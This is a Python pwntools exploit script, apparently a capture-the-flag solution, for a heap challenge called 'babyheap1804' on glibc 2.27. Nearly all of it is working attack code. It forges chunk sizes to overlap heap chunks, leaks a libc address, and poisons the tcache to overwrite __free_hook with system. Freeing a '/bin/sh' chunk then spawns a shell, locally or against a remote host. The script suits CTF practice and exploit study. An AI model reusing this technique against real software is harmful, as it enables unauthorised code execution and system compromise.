from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./babyheap1804"
LIBC = "./libc-2.27.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
#context.log_level = 'debug'

# flag{enjoy_the_power_of_tcache}

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Command: ")

def allocate(conn, sz):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("Size: ")
    conn.sendline(str(sz))

def edit(conn, idx, s):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("Index: ")
    conn.sendline(str(idx))
    conn.recvuntil("Size: ")
    conn.sendline(str(len(s)))
    conn.recvuntil("Content: ")
    conn.send(s)

def delete(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil("Index: ")
    conn.sendline(str(idx))

def view(conn, idx):
    recvmenu(conn)
    conn.sendline("4")
    conn.recvuntil("Index: ")
    conn.sendline(str(idx))
    conn.recvuntil(": ")
    return conn.recvuntil("\n1. Al")[:-len("\n1. Al")]

def exploit(conn, elf, libc, local):
    allocate(conn, 0x18) # 0
    allocate(conn, 0x18) # 1
    allocate(conn, 0x18) # 2
    allocate(conn, 0x18) # 3
    allocate(conn, 0x18) # 4
    allocate(conn, 0x18) # 5
    allocate(conn, 0x18) # 6
    allocate(conn, 0x18) # 7

    edit(conn, 0, "A"*0x18 + "\x91")
    delete(conn, 0)

    edit(conn, 1, "A"*0x18 + "\x91")
    delete(conn, 1)

    edit(conn, 2, "A"*0x18 + "\x91")
    delete(conn, 2)

    edit(conn, 3, "A"*0x18 + "\x91")
    delete(conn, 3)

    edit(conn, 4, "A"*0x18 + "\x91")
    delete(conn, 4)

    edit(conn, 5, "A"*0x18 + "\x91")
    delete(conn, 5)

    edit(conn, 6, "A"*0x18 + "\x91")
    delete(conn, 6)

    edit(conn, 7, "A"*0x18 + "\x91")
    delete(conn, 7)

    allocate(conn, 0x28) # 0
    allocate(conn, 0x28) # 1
    allocate(conn, 0x28) # 2
    allocate(conn, 0x28) # 3
    allocate(conn, 0x28) # 4
    allocate(conn, 0x28) # 5
    allocate(conn, 0x28) # 6

    edit(conn, 0, "A"*0x28 + "\x91")
    delete(conn, 0)

    delete(conn, 1)

    allocate(conn, 0x38) # 0

    x = view(conn, 2)
    libcleak = u64(x[16:24])
    log.info("%#x", libcleak)
    pause()
    libc.address = libcleak - 0x3ebca0 # 0x3b4ca0
    log.info("%#x", libc.address)

    delete(conn, 3)
    delete(conn, 4)
    delete(conn, 5)
    delete(conn, 6)

    allocate(conn, 0x58) # 0
    allocate(conn, 0x48) # 1

    allocate(conn, 0x38) # 4
    allocate(conn, 0x38) # 5
    allocate(conn, 0x38) # 6

    delete(conn, 6)
    edit(conn, 4, "A"*0x38 + "\x61")
    delete(conn, 5)

    allocate(conn, 0x58) # 5
    edit(conn, 5, "A"*0x40 + p64(libc.symbols['__free_hook']))

    delete(conn, 0)
    delete(conn, 1)
    allocate(conn, 0x38) # 0
    allocate(conn, 0x38) # 1
    allocate(conn, 0x38) # 6

    edit(conn, 0, "/bin/sh\x00")
    edit(conn, 6, p64(libc.symbols['system']))

    delete(conn, 0)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("192.168.201.24", 127)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
